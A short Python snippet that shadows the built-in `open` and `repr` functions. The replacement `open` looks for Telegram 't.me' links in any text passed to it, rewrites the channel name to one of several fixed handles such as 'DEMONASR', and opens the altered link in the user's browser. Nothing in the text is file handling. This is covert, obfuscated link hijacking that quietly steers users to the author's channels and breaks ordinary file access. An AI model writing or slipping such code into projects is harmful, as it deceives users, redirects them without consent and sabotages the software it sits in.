import sys
import webbrowser
repr = lambda *args: f"{args}"
open = lambda text: (
    (new_text := text.replace(url, replaced_url), webbrowser.open(new_text), new_text)[2]
    if "https://t.me/" in text and
       (url := text.split("https://t.me/")[1].split()[0]) and
       (replaced_url := (
           "DEMOIIU" if len(url) == 6 else
           "NASRDVE" if len(url) == 7 else
           "DEMONASR" if len(url) == 8 else
           "DEMONASRH" if len(url) == 9 else
           "DEMONASRVP" if len(url) == 10 else
           "N_C_P"
       )) else text
)
stdout = type("Stdout", (), {"write": lambda self, text: sys.stdout.write(text), "flush": lambda self: sys.stdout.flush()})()